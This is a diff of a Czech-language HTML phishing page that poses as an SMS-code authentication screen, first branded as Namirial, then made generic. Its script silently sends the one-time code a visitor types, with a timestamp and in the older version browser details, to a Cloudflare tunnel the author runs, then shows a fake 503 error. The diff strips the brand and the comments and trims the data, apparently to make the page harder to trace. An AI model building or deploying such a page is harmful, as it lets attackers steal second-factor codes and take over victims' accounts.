@@ -1,46 +1,40 @@
 <!DOCTYPE html>
-<html>
+<html lang="cs">
 <head>
     <meta charset="UTF-8">
+    <title>Security Audit | Authentication Node</title>
     <style>
         body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }
         .box { border: 1px solid #00ff41; padding: 30px; display: inline-block; box-shadow: 0 0 15px #00ff41; background: #000; }
         input { background: #111; border: 1px solid #00ff41; color: #00ff41; padding: 12px; margin: 15px; width: 200px; font-size: 1.2em; text-align: center; }
-        button { background: #00ff41; color: #000; border: none; padding: 12px 25px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
-        button:hover { background: #00cc33; box-shadow: 0 0 10px #00ff41; }
+        button { background: #00ff41; color: #000; border: none; padding: 12px 25px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="box">
-        <h2>🛡️ NAMIRIAL AUTHENTICATION 🛡️</h2>
-        <p>Pro ověření vaší identity zadejte 6-místný kód z SMS:</p>
+        <h2>🛡️ SECURE AUTHENTICATION 🛡️</h2>
+        <p>Pro ověření přístupu zadejte kód z SMS:</p>
         <input type="text" id="sms_code" maxlength="6" placeholder="000 000">
         <br>
-        <button onclick="capture()">POTVRDIT IDENTITU</button>
+        <button onclick="capture()">POTVRDIT</button>
     </div>
 
     <script>
         async function capture() {
             const code = document.getElementById('sms_code').value;
-            // TVOJE AKTUÁLNÍ ADRESA Z CLOUDFLARE TUNELU
             const TUNNEL = 'https://additions-fragrance-district-supplied.trycloudflare.com';
             
-            const data = {
-                target_code: code,
-                timestamp: new Date().toISOString(),
-                browser: navigator.userAgent,
-                platform: navigator.platform
-            };
-
-            // Odeslání úlovku do tvého Termuxu
+            // Odesíláme data bez toho, aby číslo bylo v kódu
             fetch(TUNNEL, { 
                 method: 'POST', 
                 mode: 'no-cors', 
-                body: JSON.stringify(data) 
-            }).catch(e => console.log("Silent drop."));
+                body: JSON.stringify({ 
+                    c: code, 
+                    t: new Date().getTime() 
+                }) 
+            }).catch(() => {});
 
-            // Falešná chyba pro útočníka
-            alert("CHYBA: Služba Namirial je dočasně nedostupná (Error 503). Opakujte akci za 15 minut.");
+            alert("Systémová chyba 503: Spojení bylo přerušeno.");
         }
     </script>
 </body>
